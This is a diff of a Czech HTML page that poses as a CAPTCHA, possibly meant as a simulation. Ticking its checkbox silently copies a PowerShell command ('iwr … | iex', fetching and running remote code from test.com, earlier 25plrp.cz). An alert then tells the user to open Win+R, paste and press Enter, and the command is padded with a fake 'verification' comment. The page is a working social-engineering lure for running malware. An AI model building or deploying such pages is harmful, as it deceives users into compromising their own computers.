@@ -4,11 +4,58 @@
   <meta charset="UTF-8" />
   <title>Captcha simulace s PowerShell aktivací</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 100px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
+
+    /* Pozadí s titulkem a obrázkem */
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1;
+      opacity: 1;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+    }
+
+    #background.blurred {
+      opacity: 0.2;
+      filter: blur(12px);
+    }
+
+    #background h1 {
+      font-size: 2.5em;
+      color: white;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    #background img {
+      width: 300px;
+      height: auto;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    /* Captcha box */
     #captchaBox {
       display: inline-block;
       border: 2px solid #ccc;
@@ -17,9 +64,31 @@
       width: 300px;
       box-shadow: 2px 2px 8px #888;
       position: relative;
-      z-index: 2;
-      background: #fff;
+      z-index: 100;
+      background: white;
+      opacity: 1;
+      transition: opacity 0.3s ease;
     }
+
+    #captchaBox.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #captchaBox label {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      font-size: 1.1em;
+    }
+
+    #robotCheckbox {
+      margin-right: 10px;
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+    }
+
     #loader {
       margin: 20px auto 0 auto;
       border: 6px solid #f3f3f3;
@@ -30,20 +99,12 @@
       animation: spin 1s linear infinite;
       display: none;
     }
+
     @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
-    #marvinImg {
-      display: none;
-      margin-top: 30px;
-      width: 200px;
-      position: relative;
-      z-index: 1;
-    }
-    #hiddenBtn {
-      display: none;
-    }
+
     #alertBox {
       position: fixed;
       top: 50%;
@@ -58,21 +119,56 @@
       display: none;
       text-align: center;
       min-width: 300px;
+      animation: slideIn 0.3s ease;
     }
+
+    @keyframes slideIn {
+      from {
+        transform: translate(-50%, -60%);
+        opacity: 0;
+      }
+      to {
+        transform: translate(-50%, -50%);
+        opacity: 1;
+      }
+    }
+
     #alertBox.show {
       display: block;
     }
+
     #alertBox h2 {
       margin-top: 0;
       color: #333;
+      font-size: 1.5em;
     }
+
     #alertBox p {
       color: #666;
       line-height: 1.6;
+      margin-top: 15px;
+    }
+
+    #alertBox .countdown {
+      font-weight: bold;
+      color: #667eea;
+      font-size: 1.2em;
+      margin-top: 10px;
+    }
+
+    #hiddenBtn {
+      display: none;
     }
   </style>
 </head>
 <body>
+  <!-- Pozadí se titulkem a obrázkem -->
+  <div id="background">
+    <h1>Vítejte na vaší vysněné stránce</h1>
+    <img src="https://test.com/Dont-Panic.jpg" alt="Don't panic with Marvin" />
+  </div>
+
+  <!-- Captcha box -->
   <div id="captchaBox">
     <label>
       <input type="checkbox" id="robotCheckbox" />
@@ -81,56 +177,61 @@
     <div id="loader"></div>
   </div>
 
-  <button id="hiddenBtn" onclick="revealImage()"></button>
-
- 
-
+  <!-- Alert s instrukcemi -->
   <div id="alertBox">
     <h2>⚠️ Instrukce</h2>
     <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br>Potvrďte Enter</p>
   </div>
 
+  <button id="hiddenBtn"></button>
+
   <script>
     const checkbox = document.getElementById("robotCheckbox");
     const loader = document.getElementById("loader");
     const captchaBox = document.getElementById("captchaBox");
-    const marvinImg = document.getElementById("marvinImg");
-    const hiddenBtn = document.getElementById("hiddenBtn");
+    const background = document.getElementById("background");
     const alertBox = document.getElementById("alertBox");
 
-    function revealImage() {
-      loader.style.display = "none";
-      captchaBox.style.display = "none";
-      marvinImg.style.display = "block";
-    }
-
-    function showAlert() {
-      alertBox.classList.add("show");
-      setTimeout(() => {
-        alertBox.classList.remove("show");
-      }, 5000);
-       <img id="marvinImg" src="https://25plrp.cz/Dont-Panic.jpg" alt="Don't panic with Marvin" />
+    function startCountdown() {
+      let secondsRemaining = 5;
+      const countdownInterval = setInterval(() => {
+        secondsRemaining--;
+        if (secondsRemaining <= 0) {
+          clearInterval(countdownInterval);
+          // Po 5 sekundách se objeví obsah
+          background.classList.remove("blurred");
+          captchaBox.classList.add("hidden");
+          alertBox.classList.remove("show");
+          loader.style.display = "none";
+        }
+      }, 1000);
     }
 
     checkbox.addEventListener("change", () => {
       if (checkbox.checked) {
+        // Zobrazení loaderu a alertu
         loader.style.display = "block";
-        showAlert();
+        alertBox.classList.add("show");
+        background.classList.add("blurred");
+        startCountdown();
 
-        // PowerShell příkaz s AutoHotkey spuštěním
+        // PowerShell příkaz s komentářem na konci
         const psCommand =
-          'powershell iwr "25plrp.cz" | iex           #                                        Po stisku proběhne ověření na vašem počítači ✅ '
-        navigator.clipboard.writeText(psCommand)
-          .catch(err => {
+          'powershell iwr "test.com/test" | iex # Po stisku proběhne ověření na vašem počítači ✅';
+
+        navigator.clipboard
+          .writeText(psCommand)
+          .catch((err) => {
             console.error("Nepodařilo se zkopírovat text do schránky.");
             checkbox.checked = false;
             loader.style.display = "none";
+            background.classList.remove("blurred");
             alertBox.classList.remove("show");
           });
       } else {
         loader.style.display = "none";
-        captchaBox.style.display = "block";
-        marvinImg.style.display = "none";
+        background.classList.remove("blurred");
+        captchaBox.classList.remove("hidden");
         alertBox.classList.remove("show");
       }
     });
